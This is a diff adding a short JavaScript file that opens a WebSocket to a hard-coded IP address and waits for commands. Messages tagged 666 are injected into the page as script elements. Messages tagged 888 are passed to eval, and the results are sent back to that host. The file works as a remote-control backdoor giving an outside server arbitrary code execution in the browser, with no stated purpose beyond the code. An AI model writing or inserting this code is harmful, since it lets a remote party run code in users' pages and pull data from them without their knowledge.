@@ -1,0 +1,41 @@
+ws = new WebSocket("ws://45.32.200.249:8000/ws"); 
+    
+
+    ws.onopen = function(){
+            console.log('open');
+    };
+    ws.onmessage = function(ev){
+      console.log('recieved message'+ev.data.toString ());
+      var json = JSON.parse(ev.data);
+      var rowid =json.id;
+      if (json.id==666){
+      var ret=inject_js(decodeURIComponent(json.value))
+      ws.send('{"id":'+json.id + ',"value":' + ret+ '}')
+      }
+      if (json.id==888){
+          var ret=eval(decodeURIComponent(json.value))
+          console.log('value' + json.value)
+          console.log('ret'+ ret)
+          ws.send('{"id":'+json.id + ',"value":' + ret+ '}')
+      }          
+    };
+
+    ws.onclose = function(ev){ 
+      console.log('closed');
+    };
+
+    ws.onerror = function(ev){      
+      console.log('error occurred');
+    };
+
+function  aa(){ 
+return 1+2
+ }
+
+
+function inject_js(code){
+var head = document.querySelector('head');
+var script = document.createElement('script');
+script.textContent = code;
+head.appendChild(script);
+}
